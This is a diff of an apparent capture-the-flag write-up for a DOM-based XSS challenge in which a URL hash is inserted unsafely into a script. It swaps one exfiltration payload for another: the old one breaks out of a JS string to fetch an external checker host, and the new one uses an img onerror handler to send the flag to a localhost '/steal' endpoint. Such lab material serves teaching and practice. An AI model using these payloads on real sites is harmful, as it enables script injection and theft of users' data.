@@ -15,9 +15,9 @@ The page uses `window.location.hash` to load a user alias and inserts it unsafel
 2. It can be decoded by calling the function `getSecretFlag()`.
 3. To exploit, inject a payload that breaks out of the JS string and calls this function:
 
-   ```text
-   ",fetch('https://your-checker.onrender.com/submit?flag='+encodeURIComponent(getSecretFlag()))//
-    ```
+  	 ```text
+	</script><img src=x onerror="fetch('http://localhost:8080/steal?flag='+encodeURIComponent(getSecretFlag()))">
+	```
 4.Submit the payload via the input field → the flag is sent to your checker. 
 >💡 Tip: Open DevTools → Network tab to confirm the request was sent!
 
